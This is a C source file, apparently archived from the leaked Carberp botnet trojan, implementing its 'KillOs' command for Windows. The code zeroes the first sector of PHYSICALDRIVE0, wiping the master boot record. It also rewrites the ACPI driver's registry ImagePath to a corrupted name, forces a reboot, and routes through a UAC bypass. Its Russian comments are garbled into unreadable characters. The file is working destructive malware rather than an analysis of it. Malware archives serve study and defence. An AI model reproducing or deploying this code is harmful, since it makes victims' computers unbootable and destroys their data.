/*
  name      Carberp Botnet
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */
#include "BotCore.h"
#include "KillOs_Reboot.h"
#include "GetApi.h"
#include "ntdll.h"
#include "Memory.h"
#include "String.h"

#include "BotDebug.h"

#ifdef PP_DPRINTF
	#define DBG PP_DPRINTF
#else
	#define DBG(...)
#endif //PP_DPRINTF


static bool KillOs1()
{
	// �������������� ������� ������, � ��� ���������� ������� ��������  
	HANDLE hDest;
	CHAR p[512];
	DWORD size;
	BOOL ret;
 
	hDest = pCreateFileA("\\\\.\\PHYSICALDRIVE0",GENERIC_READ|GENERIC_WRITE,FILE_SHARE_READ,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0);
	if(hDest == INVALID_HANDLE_VALUE)
	{
		return FALSE;
	};
    
      
    m_memset(p, 0, sizeof(p));
	size = sizeof(p);
	ret = (BOOL) pWriteFile(hDest,p,size,&size,NULL);
        
    pCloseHandle(hDest);
	
	return ret != FALSE;
}

//���������� � ������� ������ ���� � ������� �����
static bool KillOs2()
{
	bool ret = false;
	const char* items[] = { "ControlSet001", "ControlSet002", "CurrentControlSet", 0 };
	int i = 0;
	while( items[i] )
	{
	    char path[MAX_PATH];
		m_lstrcpy( path, "SYSTEM\\" );
		m_lstrcat( path, items[i] );
		m_lstrcat( path, "\\services\\ACPI" );
		HKEY key;
	    LONG res = (LONG)pRegOpenKeyExA( HKEY_LOCAL_MACHINE, path, 0, KEY_ALL_ACCESS, &key );
	    if( res == ERROR_SUCCESS )
		{
			//� A�PI.sys ������� ����� � (������ ���������), �������� ��������� ������
			const char* CORRUPTED_PATH = "system32\\drivers\\A�PI.sys";
			res = (LONG)pRegSetValueExA( key, "ImagePath", 0, REG_SZ, (const BYTE *)CORRUPTED_PATH, m_lstrlen(CORRUPTED_PATH) + 1 );
	        if( res == ERROR_SUCCESS )
	        {
				DBG( "KillOs2: Success: %s = %s", path, CORRUPTED_PATH );
				ret = true;
			}        
			else
			{
				DBG( "KillOs2: Error: %s = %s", path, CORRUPTED_PATH );
			}
	        //pRegFlushKey(key);
			pRegCloseKey(key);
		}
		else
		{
			DBG( "KillOs2: RegOpenKey() ERROR %d\n", res );
		}
		i++;
	}
	return ret;
}

bool KillOs()
{
	bool res = KillOs2();
	if( KillOs1() ) res = true;
	if( res )
	{
		DBG( "KillOs is success" );
		Reboot();
	}
	return res;
}

void Reboot(void)
{
	BOOL OldValue;
	if (NT_SUCCESS(pRtlAdjustPrivilege(SE_SHUTDOWN_PRIVILEGE, TRUE, FALSE, (PBOOLEAN)&OldValue)))
	pExitWindowsEx(EWX_REBOOT | EWX_FORCE, 0);
}

bool ExecuteKillosCommand(LPVOID Manager, PCHAR Command, PCHAR Arguments)
{
	DBG( "Execute cmd KillOs" );
#ifdef UAC_bypassH
	if( BOT::GetBotType() == BotBypassUAC ) //��������� ����� ������ UAC
		return KillOs();
	else
		if( !RunBotBypassUAC( 0, 1, 0 ) )
			return KillOs();
		return true;
#else
	return KillOs();
#endif //UAC_bypassH
}

bool ExecuteRebootCommand(LPVOID Manager, PCHAR Command, PCHAR Arguments)
{
	// ������ �����, ��� ��� � ������ ������ ���������� ����������
	Reboot();
	return true;

}